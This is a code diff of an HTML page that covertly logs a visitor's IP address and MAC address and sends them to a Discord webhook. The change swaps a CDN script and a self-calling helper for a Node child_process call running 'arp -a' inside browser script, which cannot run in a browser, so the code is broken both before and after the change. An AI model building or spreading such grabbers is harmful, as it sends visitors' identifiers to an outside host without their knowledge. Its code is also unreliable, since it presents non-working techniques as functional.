@@ -2,7 +2,6 @@
 <html>
   <head>
     <title>Log User IP and MAC Address</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/get-mac-address/1.0.3/get-mac-address.min.js"></script>
   </head>
   <body>
     <script>
@@ -14,22 +13,34 @@
       document.cookie = `ip_address=${ipAddress}; path=/`;
 
       // Get the user's MAC address
-      getMacAddress((error, macAddress) => {
-        if (error) {
-          console.error(error);
-          macAddress = "Unknown";
+      try {
+        const { execSync } = require("child_process");
+
+        // Execute the `arp` command and parse the output to get the MAC address
+        const arpOutput = execSync("arp -a").toString();
+        const lines = arpOutput.split("\n");
+
+        for (const line of lines) {
+          if (line.includes(ipAddress)) {
+            const macAddress = line.split(" ")[3].trim();
+
+            // Set the MAC address cookie
+            document.cookie = `mac_address=${macAddress}; path=/`;
+
+            // Log the IP and MAC addresses
+            console.log(`IP Address: ${ipAddress}`);
+            console.log(`MAC Address: ${macAddress}`);
+
+            // Send the IP and MAC addresses to the Discord webhook
+            sendToDiscordWebhook(ipAddress, macAddress);
+
+            break;
+          }
         }
-
-        // Set the MAC address cookie
-        document.cookie = `mac_address=${macAddress}; path=/`;
-
-        // Log the IP and MAC addresses
-        console.log(`IP Address: ${ipAddress}`);
-        console.log(`MAC Address: ${macAddress}`);
-
-        // Send the IP and MAC addresses to the Discord webhook
-        sendToDiscordWebhook(ipAddress, macAddress);
-      });
+      } catch (error) {
+        console.error(error);
+        macAddress = "Unknown";
+      }
 
       // Function to send the IP and MAC addresses to the Discord webhook
       async function sendToDiscordWebhook(ipAddress, macAddress) {
@@ -56,17 +67,6 @@
         } catch (error) {
           console.error(error);
         }
-      }
-
-      // Function to get the user's MAC address
-      function getMacAddress(callback) {
-        getMacAddress((error, macAddress) => {
-          if (error) {
-            callback(error, null);
-          } else {
-            callback(null, macAddress);
-          }
-        });
       }
     </script>
   </body>
